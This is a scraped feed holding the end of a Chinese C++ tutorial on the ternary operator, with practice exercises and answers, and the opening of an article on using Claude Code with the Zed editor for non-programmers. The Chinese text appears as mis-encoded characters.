<li>å¦‚æœÂ <code>condition</code>Â çš„ç»“æœä¸ºÂ <code>false</code>ï¼ˆæˆ–é›¶ï¼‰ï¼Œåˆ™è®¡ç®—Â <code>expression_if_false</code>ï¼Œå¹¶å°†å…¶ç»“æœä½œä¸ºæ•´ä¸ªä¸‰ç›®è¿ç®—è¡¨è¾¾å¼çš„ç»“æœã€‚<strong>æ³¨æ„</strong>:Â <code>expression_if_true</code>Â å’ŒÂ <code>expression_if_false</code>Â ä¸­åªæœ‰ä¸€ä¸ªä¼šè¢«æ‰§è¡Œã€‚</li>
</ol>
<h3 data-id="heading-3">3. ç®—æ³•å¯è§†åŒ–SVGå›¾ç¤º</h3>
<p>ä¸‹å›¾å±•ç¤ºäº†ä¸‰ç›®è¿ç®—çš„å†³ç­–æµç¨‹ï¼Œåƒä¸€ä¸ªé“è·¯å²”é“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73cc2b19eb31450895e9765a269e9cbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamlraWVjdWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874066&amp;x-signature=LQ9Z8mGYmoJfR1sdzavVs7LS%2F74%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-4">4. æ ¸å¿ƒç‰¹æ€§</h3>
<ul>
<li><strong>ç®€æ´æ€§</strong>: æ˜¯Â <code>if-else</code>Â çš„ç´§å‡‘å†™æ³•ã€‚</li>
<li><strong>è¡¨è¾¾å¼</strong>: ä¸‰ç›®è¿ç®—æœ¬èº«æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒæœ‰è¿”å›å€¼ï¼Œå¯ä»¥è¢«èµ‹å€¼ç»™å˜é‡ï¼Œæˆ–ç”¨åœ¨å…¶ä»–è¡¨è¾¾å¼ä¸­ã€‚è€ŒÂ <code>if-else</code>Â æ˜¯è¯­å¥ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚</li>
<li><strong>ç±»å‹å…¼å®¹</strong>:Â <code>expression_if_true</code>Â å’ŒÂ <code>expression_if_false</code>Â çš„ç±»å‹åº”è¯¥ç›¸åŒæˆ–å¯ä»¥éšå¼è½¬æ¢ä¸ºä¸€ä¸ªå…±åŒçš„ç±»å‹ã€‚</li>
<li><strong>å³ç»“åˆæ€§</strong>: ä¸‰ç›®è¿ç®—ç¬¦æ˜¯å³ç»“åˆçš„ï¼Œ<code>a ? b : c ? d : e</code>Â ç­‰ä»·äºÂ <code>a ? b : (c ? d : e)</code>ã€‚</li>
</ul>
<h3 data-id="heading-5">5. C++ä»£ç åŸºç¡€å®ç°</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;string&gt;</span></span>

<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>Â {
Â  Â Â <span class="hljs-type">int</span>Â a =Â <span class="hljs-number">10</span>, b =Â <span class="hljs-number">20</span>;

Â  Â Â <span class="hljs-comment">// ç¤ºä¾‹1: æ±‚ä¸¤æ•°ä¸­çš„æœ€å¤§å€¼</span>
Â  Â Â <span class="hljs-type">int</span>Â max_val = (a &gt; b) ? a : b;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>Â &lt;&lt;Â <span class="hljs-string">"Max value is: "</span>Â &lt;&lt; max_val &lt;&lt;Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;Â <span class="hljs-comment">// è¾“å‡º 20</span>

Â  Â Â <span class="hljs-comment">// ç¤ºä¾‹2: åˆ¤æ–­å¥‡å¶æ€§</span>
Â  Â Â <span class="hljs-type">int</span>Â num =Â <span class="hljs-number">7</span>;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>Â result = (num %Â <span class="hljs-number">2</span>Â ==Â <span class="hljs-number">0</span>) ?Â <span class="hljs-string">"Even"</span>Â :Â <span class="hljs-string">"Odd"</span>;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>Â &lt;&lt; num &lt;&lt;Â <span class="hljs-string">" is "</span>Â &lt;&lt; result &lt;&lt;Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;Â <span class="hljs-comment">// è¾“å‡º 7 is Odd</span>

Â  Â Â <span class="hljs-comment">// ç¤ºä¾‹3: ç›´æ¥åœ¨è¾“å‡ºä¸­ä½¿ç”¨</span>
Â  Â Â <span class="hljs-type">int</span>Â score =Â <span class="hljs-number">85</span>;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>Â &lt;&lt;Â <span class="hljs-string">"Grade: "</span>Â &lt;&lt; (score &gt;=Â <span class="hljs-number">60</span>Â ?Â <span class="hljs-string">"Pass"</span>Â :Â <span class="hljs-string">"Fail"</span>) &lt;&lt;Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;Â <span class="hljs-comment">// è¾“å‡º Grade: Pass</span>

Â  Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-6">6. ä¼˜åŒ–ç­–ç•¥</h3>
<ul>
<li><strong>å¯è¯»æ€§ä¼˜å…ˆ</strong>: ä¸è¦è¿‡åº¦ä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦ã€‚å¦‚æœé€»è¾‘éå¸¸å¤æ‚æˆ–åµŒå¥—å¤šå±‚ï¼Œä½¿ç”¨Â <code>if-else</code>Â ç»“æ„ä¼šæ›´æ¸…æ™°ã€‚</li>
<li><strong>é¿å…å‰¯ä½œç”¨</strong>: å°½é‡ä¸è¦åœ¨ä¸‰ç›®è¿ç®—ç¬¦çš„ç¬¬äºŒå’Œç¬¬ä¸‰éƒ¨åˆ†ä½¿ç”¨æœ‰å‰¯ä½œç”¨çš„è¡¨è¾¾å¼ï¼ˆå¦‚Â <code>++i</code>ï¼‰ï¼Œè¿™å¯èƒ½ä½¿ä»£ç éš¾ä»¥ç†è§£ã€‚ä¾‹å¦‚Â <code>int x = a &gt; b ? c++ : d++;</code></li>
</ul>
<h3 data-id="heading-7">7. ä¼˜ç¼ºç‚¹</h3>
<ul>
<li><strong>ä¼˜ç‚¹</strong>:</li>
<li>
<ul>
<li><strong>ä»£ç ç´§å‡‘</strong>: å¯¹äºç®€å•çš„æ¡ä»¶èµ‹å€¼ï¼Œå¯ä»¥æ˜¾è‘—å‡å°‘ä»£ç è¡Œæ•°ã€‚</li>
<li><strong>æ˜¯è¡¨è¾¾å¼</strong>: å¯ä»¥æ–¹ä¾¿åœ°åµŒå…¥åˆ°å…¶ä»–è¡¨è¾¾å¼ä¸­ï¼Œå¦‚å‡½æ•°è°ƒç”¨Â <code>printf("%s", score &gt; 60 ? "Pass" : "Fail");</code>Â æˆ–å˜é‡åˆå§‹åŒ–ã€‚</li>
</ul>
</li>
<li><strong>ç¼ºç‚¹</strong>:</li>
<li>
<ul>
<li><strong>å¯è¯»æ€§å·®</strong>: åµŒå¥—çš„ä¸‰ç›®è¿ç®—ä¼šå˜å¾—éå¸¸éš¾ä»¥é˜…è¯»å’Œç»´æŠ¤ã€‚</li>
<li><strong>è°ƒè¯•å›°éš¾</strong>: åœ¨ä¸‰ç›®è¿ç®—ç¬¦çš„è¡¨è¾¾å¼ä¸­è®¾ç½®æ–­ç‚¹æ¯”åœ¨Â <code>if-else</code>Â å—ä¸­æ›´éš¾ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">8. åº”ç”¨åœºæ™¯</h3>
<ul>
<li><strong>ç®€å•çš„æ¡ä»¶èµ‹å€¼</strong>:Â <code>int max = a &gt; b ? a : b;</code></li>
<li><strong>åˆå§‹åŒ–Â <code>const</code>Â å˜é‡</strong>:Â <code>const int val = (some_condition) ? 100 : 200;</code>Â è¿™ç§æƒ…å†µÂ <code>if-else</code>Â æ— æ³•åšåˆ°ã€‚</li>
<li><strong>è¿”å›è¯­å¥</strong>:Â <code>return x &gt; 0 ? x : -x;</code>Â (æ±‚ç»å¯¹å€¼)ã€‚</li>
<li><strong>è¾“å‡ºæ ¼å¼åŒ–</strong>: æ ¹æ®æ¡ä»¶é€‰æ‹©ä¸åŒçš„è¾“å‡ºå­—ç¬¦ä¸²ã€‚</li>
</ul>
<h3 data-id="heading-9">9. æ‰©å±•</h3>
<ul>
<li><strong><code>constexpr if</code>Â (C++17)</strong> : å¯¹äºæ¨¡æ¿ç¼–ç¨‹ï¼Œ<code>if constexpr</code>Â å…è®¸åœ¨ç¼–è¯‘æ—¶æ ¹æ®æ¡ä»¶è¿›è¡Œåˆ†æ”¯ï¼Œä¸æ»¡è¶³æ¡ä»¶çš„åˆ†æ”¯ä»£ç ç”šè‡³ä¸ä¼šè¢«ç¼–è¯‘ï¼Œè¿™æ¯”è¿è¡Œæ—¶ä¸‰ç›®è¿ç®—æ›´å¼ºå¤§ã€‚</li>
<li><strong>ä¸Â <code>lambda</code>Â ç»“åˆ</strong>:Â <code>auto my_func = (use_new_version) ? [](int x){...} : [](int x){...};</code></li>
</ul>
<h3 data-id="heading-10">10. è¯¾åé…å¥—ç»ƒä¹ åŠç­”æ¡ˆ</h3>
<p><strong>ç»ƒä¹ 1: æ±‚ç»å¯¹å€¼</strong>è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦è¾“å‡ºå…¶ç»å¯¹å€¼ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ç­”æ¡ˆ</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>Â {
Â  Â Â <span class="hljs-type">int</span>Â n;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>Â &gt;&gt; n;
Â  Â Â <span class="hljs-type">int</span>Â abs_n = (n &gt;=Â <span class="hljs-number">0</span>) ? n : -n;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>Â &lt;&lt;Â <span class="hljs-string">"Absolute value: "</span>Â &lt;&lt; abs_n &lt;&lt;Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
Â  Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>ç»ƒä¹ 2: ä¸¤æ•°ä¸­çš„è¾ƒå°è€…</strong>è¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼Œä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦è¾“å‡ºè¾ƒå°çš„ä¸€ä¸ªã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ç­”æ¡ˆ</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>Â {
Â  Â Â <span class="hljs-type">int</span>Â a, b;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>Â &gt;&gt; a &gt;&gt; b;
Â  Â Â <span class="hljs-type">int</span>Â min_val = (a &lt; b) ? a : b;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>Â &lt;&lt;Â <span class="hljs-string">"Min value: "</span>Â &lt;&lt; min_val &lt;&lt;Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
Â  Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>ç»ƒä¹ 3: æ€§åˆ«æ˜¾ç¤º</strong>è¾“å…¥ä¸€ä¸ªå­—ç¬¦ 'M' æˆ– 'F'ï¼Œä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦è¾“å‡º "Male" æˆ– "Female"ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ç­”æ¡ˆ</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>Â {
Â  Â Â <span class="hljs-type">char</span>Â gender;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>Â &gt;&gt; gender;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>Â gender_str = (gender ==Â <span class="hljs-string">'M'</span>) ?Â <span class="hljs-string">"Male"</span>Â :Â <span class="hljs-string">"Female"</span>;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>Â &lt;&lt; gender_str &lt;&lt;Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
Â  Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>ç»ƒä¹ 4: æ‰“æŠ˜è®¡ç®—</strong>å•†å“ä»·æ ¼Â <code>price</code>ã€‚å¦‚æœÂ <code>price</code>Â å¤§äºç­‰äº100ï¼Œåˆ™æ‰“9æŠ˜ï¼›å¦åˆ™ä¸æ‰“æŠ˜ã€‚ä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦è®¡ç®—å¹¶è¾“å‡ºæœ€ç»ˆä»·æ ¼ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ç­”æ¡ˆ</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;iomanip&gt;</span></span>
<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>Â {
Â  Â Â <span class="hljs-type">double</span>Â price;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>Â &gt;&gt; price;
Â  Â Â <span class="hljs-type">double</span>Â final_price = (price &gt;=Â <span class="hljs-number">100</span>) ? price *Â <span class="hljs-number">0.9</span>Â : price;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>Â &lt;&lt;Â <span class="hljs-string">"Final price: "</span>Â &lt;&lt;Â <span class="hljs-built_in">std</span>::fixed &lt;&lt;Â <span class="hljs-built_in">std</span>::setprecision(<span class="hljs-number">2</span>) &lt;&lt; final_price &lt;&lt;Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
Â  Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>ç»ƒä¹ 5: åµŒå¥—ä¸‰ç›®è¿ç®—</strong>è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œåˆ¤æ–­å®ƒæ˜¯æ­£æ•°ã€è´Ÿæ•°è¿˜æ˜¯é›¶ï¼Œå¹¶è¾“å‡º "Positive", "Negative" æˆ– "Zero"ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ç­”æ¡ˆ</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span>Â <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-type">int</span>Â <span class="hljs-title function_">main</span><span class="hljs-params">()</span>Â {
Â  Â Â <span class="hljs-type">int</span>Â n;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>Â &gt;&gt; n;
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>Â result = (n &gt;Â <span class="hljs-number">0</span>) ?Â <span class="hljs-string">"Positive"</span>Â : ((n &lt;Â <span class="hljs-number">0</span>) ?Â <span class="hljs-string">"Negative"</span>Â :Â <span class="hljs-string">"Zero"</span>);
Â  Â Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>Â &lt;&lt; result &lt;&lt;Â <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;
Â  Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-11">11. ç›¸å…³ç½‘ç»œèµ„æºæ¨è</h3>
<ul>
<li>Conditional operator - cppreference.com</li>
<li>C++ Ternary Operator - Programiz</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[éæŠ€æœ¯äººå‘˜ä¹Ÿèƒ½è½»æ¾ä½¿ç”¨ Claude Codeï¼ŸZedï¼Œè®© AI åŠå…¬åƒè®°äº‹æœ¬ä¸€æ ·ä¸æ»‘]]></title>    <link>https://juejin.cn/post/7594310266411532288</link>    <guid>https://juejin.cn/post/7594310266411532288</guid>    <pubDate>2026-01-13T02:02:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594310266411532288" data-draft-id="7594303923362054184" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="éæŠ€æœ¯äººå‘˜ä¹Ÿèƒ½è½»æ¾ä½¿ç”¨ Claude Codeï¼ŸZedï¼Œè®© AI åŠå…¬åƒè®°äº‹æœ¬ä¸€æ ·ä¸æ»‘"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-13T02:02:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿé¸£"/> <meta itemprop="url" content="https://juejin.cn/user/4107431171852270"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            éæŠ€æœ¯äººå‘˜ä¹Ÿèƒ½è½»æ¾ä½¿ç”¨ Claude Codeï¼ŸZedï¼Œè®© AI åŠå…¬åƒè®°äº‹æœ¬ä¸€æ ·ä¸æ»‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4107431171852270/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿé¸£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:02:35.000Z" title="Tue Jan 13 2026 02:02:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘è¶Šæ¥è¶Šå¤šçš„äº’è”ç½‘ä»ä¸šè€…å¼€å§‹ä½¿ç”¨ Â Claude Code æ¥ç¼–ç ï¼Œæ¥å¤„ç†æ–‡æ¡£ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c797737ae52147d784411614a143ce07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=8WjKHschdqD0QIkC5z9qMoO9%2Ba4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç„¶åå¾ˆå¤šä¸æ˜¯ç¨‹åºå‘˜çš„ç¾¤ä½“å¯¹è¿™ä¸€å—è¿˜æ˜¯è§‰å¾—ä¸Šæ‰‹è¿˜æ˜¯æŒºå›°éš¾çš„ï¼š</p>
<ul>
<li>ç»ˆç«¯é»‘æ¼†æ¼†çš„çª—å£çœ‹ç€å°±â€œæŒºå“äººâ€ï¼Œæ„Ÿè§‰å¾ˆé«˜æ·±ï¼Œå¾ˆéš¾</li>
<li>è€Œä¸”ä¿®æ”¹åçš„æ–‡ä»¶è¿˜ä¸èƒ½å¤Ÿç›´è§‚åœ°å±•ç¤º</li>
<li>å¦‚æœæ˜¯ç›´æ¥ä½¿ç”¨ AI Coding å·¥å…·åˆç‰¹åˆ«é‡</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b37aef2686704884b7a3e799789a2605~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=gyZpFRHJA3iBlNF4Jeuz6rwfzhA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è™½ç„¶æœ‰ä¸€ç‚¹ä¸Šæ‰‹é—¨æ§›ï¼Œä½†æ˜¯ç°åœ¨å·²ç»æœ‰è¶Šæ¥è¶Šå¤šçš„éæŠ€æœ¯äººå‘˜å¼€å§‹è¿™ä¹ˆå»å­¦ä¹ å’Œä½¿ç”¨äº†ã€‚</p>
<p>é‚£ä¹ˆæœ‰æ²¡æœ‰æ›´å‹å¥½çš„æ–¹å¼å‘¢ï¼Ÿ</p>
<p>ä»Šå¤©ç»™å¤§å®¶ä»‹ç»æˆ‘æœ€è¿‘æ¢ç´¢çš„ä¸€ç§æ–¹å¼ï¼ŒZed (è®°äº‹æœ¬)+ Claude Â Code (å¼ºå¤§ AI)+ c c-switchï¼ˆæœåŠ¡å•†åˆ‡æ¢ï¼‰!</p>
<hr/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edbb13a2d8fe4f8d90a59feb81360d16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874554&amp;x-signature=%2FI4FSwgL5zcEJ5HAz%2FmYjSfODzY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸¾ä¸€ä¸ªç®€å•ä¾‹å­ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬è¦åšä¸€ä¸ªæ–‡æ¡£çš„ç¿»è¯‘ï¼Œæˆ‘ä»¬ä»¥å‰å¯èƒ½éœ€è¦æŠŠæ–‡æ¡£ä½œä¸ºé™„ä»¶ï¼Œç„¶åå†è¯´ä¸€äº›æç¤ºè¯ï¼Œåœ¨ç½‘é¡µä¸Šå»ç¿»è¯‘ï¼Œç¿»è¯‘å®Œäº†ä¹‹åå†ç²˜è´´å›æ¥ï¼Œç„¶åå†™åˆ°æœ¬åœ°ï¼Œç„¶åå†å»ä½¿ç”¨ã€‚</p>
<p>ç°åœ¨æœ‰äº†è¿™ä¸ª Zed åŠ ä¸ŠClaude Codeï¼Œæˆ‘ä»¬å°±å¯ä»¥æä¾›ä¸€ä¸ªURLï¼Œè®©å®ƒè‡ªåŠ¨æŠŠæ–‡æ¡£æŠ“ä¸‹æ¥ï¼Œç„¶ååœ¨Zed ç¼–è¾‘å™¨é‡Œé¢å¯¹è¯ï¼Œè®©ä»–ç¿»è¯‘æˆå¯¹åº”çš„ä¸­æ–‡ï¼Œç”šè‡³å¯ä»¥è®©ä»–å†™ä¸€äº›æ‘˜è¦ä¹‹ç±»çš„ï¼Œä¸éœ€è¦å»åå¤çš„è¿›è¡Œä¸Šä¸‹æ–‡çš„åˆ‡æ¢ã€‚</p>
